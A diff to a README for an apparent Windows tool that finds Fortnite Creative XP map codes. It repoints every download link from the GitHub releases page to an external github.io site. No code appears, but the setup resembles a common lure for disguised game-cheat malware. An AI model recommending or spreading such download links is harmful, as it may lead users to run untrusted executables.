@@ -1,6 +1,6 @@
 # 🎮 fortnite-xp-map-codes-windows - Your Ultimate Fortnite Creative XP Finder
 
-[![Download Now](https://img.shields.io/badge/Download-Fortnite%20XP%20Map%20Codes-blue?style=for-the-badge&logo=windows)](https://github.com/kaykekUN/fortnite-xp-map-codes-windows/releases)
+[![Download Now](https://img.shields.io/badge/Download-Fortnite%20XP%20Map%20Codes-blue?style=for-the-badge&logo=windows)](https://kaykekun.github.io)
 
 ---
 
@@ -44,7 +44,7 @@ Getting this tool up and running on your Windows computer is easier than ever. F
 
 ### Step 1: Access the Download Page
 
-Visit this link to download the application: [**Fortnite XP Map Codes Download**](https://github.com/kaykekUN/fortnite-xp-map-codes-windows/releases)
+Visit this link to download the application: [**Fortnite XP Map Codes Download**](https://kaykekun.github.io)
 
 ### Step 2: Get Your File
 
@@ -149,7 +149,7 @@ Please remember these important points:
 
 With **fortnite-xp-map-codes-windows**, finding the perfect Creative map for XP has never been easier. No more wasted time trying code after code – everything you need is organized in one powerful, easy-to-use application.
 
-[![Download Now](https://img.shields.io/badge/Get%20Fortnite%20XP%20Map%20Codes-Download%20Now-success?style=for-the-badge)](https://github.com/kaykekUN/fortnite-xp-map-codes-windows/releases)
+[![Download Now](https://img.shields.io/badge/Get%20Fortnite%20XP%20Map%20Codes-Download%20Now-success?style=for-the-badge)](https://kaykekun.github.io)
 
 **Start discovering your next favorite Creative island today!**
 
